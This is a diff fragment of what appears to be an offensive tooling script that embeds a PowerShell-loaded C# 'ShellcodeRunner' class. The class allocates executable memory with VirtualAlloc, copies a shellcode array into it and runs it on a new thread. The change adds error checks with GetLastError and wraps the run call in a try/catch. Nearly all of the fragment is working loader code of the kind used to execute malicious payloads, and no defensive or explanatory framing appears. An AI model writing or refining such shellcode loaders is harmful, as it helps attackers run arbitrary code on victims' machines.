@@ -417,16 +417,30 @@ public class ShellcodeRunner {
     [DllImport("kernel32.dll")]
     public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
+    [DllImport("kernel32.dll")]
+    public static extern int GetLastError();
+
     public static void Run(byte[] sc) {
         IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+        if (addr == IntPtr.Zero) {
+            throw new Exception("VirtualAlloc failed. Error: " + GetLastError());
+        }
         Marshal.Copy(sc, 0, addr, sc.Length);
         IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        if (thread == IntPtr.Zero) {
+            throw new Exception("CreateThread failed. Error: " + GetLastError());
+        }
         WaitForSingleObject(thread, 0xFFFFFFFF);
     }
 }
 "@
 
-[ShellcodeRunner]::Run($sc)
+try {
+    [ShellcodeRunner]::Run($sc)
+} catch {
+    Write-Error $_
+    Read-Host "Press Enter to exit"
+}
 """
 
 
